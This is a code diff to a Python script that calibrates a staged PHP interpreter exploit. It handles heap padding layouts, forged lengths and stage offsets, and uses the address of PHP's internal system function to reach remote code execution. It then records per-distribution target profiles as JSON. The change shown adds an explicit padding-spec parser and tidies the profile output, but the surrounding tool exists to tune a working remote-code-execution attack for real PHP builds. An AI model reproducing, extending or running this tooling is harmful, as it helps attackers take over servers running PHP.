@@ -267,12 +267,37 @@ def calibrate_stage2(mod, ex, dtor, hints):
     return 0, hints.get("stage2_t", 0)
 
 
+def parse_pads(spec):
+    """Accepts bookworm | lab | an explicit pads spec like '4:4x5,31:31x6'."""
+    if spec is None or spec in ("bookworm", "lab"):
+        return spec
+    pads = []
+    for part in spec.split(","):
+        m = re.fullmatch(r"(\d+):(\d+)(?:x(\d+))?", part.strip())
+        if not m:
+            raise SystemExit(f"bad --stage3-pads item: {part!r} (expected a:bxN)")
+        pads += [(int(m[1]), int(m[2]))] * int(m[3] or 1)
+    return pads
+
+
+def stage3_profile_json(stage3):
+    """(stage3_pads, stage3_carrier) pair for the profile JSON."""
+    if not stage3:
+        return None, None
+    pads = stage3["pads"]
+    if pads == "lab":
+        return [[8, 7]] + [[7, 7]] * 5, False
+    if isinstance(pads, list):
+        return [list(p) for p in pads], True
+    return [[31, 31]] * 6, True
+
+
 def calibrate_stage3(mod, ex, chunk, lib, zif, proof, hints):
     if not chunk or not lib:
         return False, None
     layouts = []
     if hints.get("stage3_htdata"):
-        layouts.append(("hint", hints["stage3_htdata"], hints.get("stage3_pads", "bookworm")))
+        layouts.append(("hint", hints["stage3_htdata"], parse_pads(hints.get("stage3_pads"))))
     else:
         for off in (0x690D8, 0x6E0D8, 0x5404A):
             for pads in ("bookworm", "lab"):
@@ -286,6 +311,9 @@ def calibrate_stage3(mod, ex, chunk, lib, zif, proof, hints):
         if pads == "lab":
             ex.stage3_carrier = False
             ex.stage3_pads = [(8, 7)] + [(7, 7)] * 5
+        elif isinstance(pads, list):
+            ex.stage3_carrier = True
+            ex.stage3_pads = pads
         else:
             ex.stage3_carrier = True
             ex.stage3_pads = [(31, 31)] * 6
@@ -323,7 +351,8 @@ def main() -> int:
     ap.add_argument("--stage2-t", type=int)
     ap.add_argument("--stage2-v", type=int, default=16)
     ap.add_argument("--stage3-htdata", type=lambda x: int(x, 0))
-    ap.add_argument("--stage3-pads", choices=("bookworm", "lab"))
+    ap.add_argument("--stage3-pads", default=None,
+                    help='bookworm, lab, or explicit pads spec: "4:4x5,31:31x6"')
     ap.add_argument("--distro", default="unknown")
     ap.add_argument("--arch", choices=("aarch64", "amd64"), default=None)
     args = ap.parse_args()
@@ -369,6 +398,7 @@ def main() -> int:
     rce, stage3 = calibrate_stage3(mod, ex, chunk, lib, sym["zif_system"],
                                    args.proof_file, vars(args))
 
+    s3_pads, s3_carrier = stage3_profile_json(stage3)
     profile = {
         "name": f"php-{version}-{args.distro}",
         "php_version": version,
@@ -391,9 +421,8 @@ def main() -> int:
             "stage1_forge_len": forge_len,
             "stage2_t": t_index,
             "stage2_v": args.stage2_v,
-            "stage3_pads": ([[31, 31]] * 6 if stage3 and stage3["pads"] == "bookworm"
-                            else ([(8, 7)] + [(7, 7)] * 5 if stage3 else None)),
-            "stage3_carrier": (stage3["pads"] == "bookworm") if stage3 else None,
+            "stage3_pads": s3_pads,
+            "stage3_carrier": s3_carrier,
         },
         "config": cfg,
         "measured": {
